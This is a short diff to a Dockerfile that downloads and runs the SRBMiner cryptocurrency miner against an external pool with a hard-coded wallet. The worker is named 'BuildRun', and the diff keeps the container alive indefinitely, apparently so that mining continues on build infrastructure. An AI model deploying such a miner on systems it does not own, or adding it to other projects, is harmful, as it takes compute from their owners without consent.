@@ -11,11 +11,10 @@ RUN cd ~ && mkdir -p srbminer && cd srbminer && \
 
 WORKDIR /root/srbminer/SRBMiner-Multi-3-3-9
 
-# Wrapper script untuk capture exit code
 RUN echo '#!/bin/bash' > /run-miner.sh && \
     echo 'echo "Miner starting..."' >> /run-miner.sh && \
     echo './SRBMiner-MULTI -a neuromorph -o stratum.cereblix.com:3333 -u crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun -p x -t 4' >> /run-miner.sh && \
     echo 'echo "Miner exit code: $?"' >> /run-miner.sh && \
     chmod +x /run-miner.sh
 
-CMD ["/bin/bash", "-c", "sleep 1 && /run-miner.sh && sleep 3600"]
+CMD ["/bin/bash", "-c", "sleep 1 && /run-miner.sh && sleep infinity"]
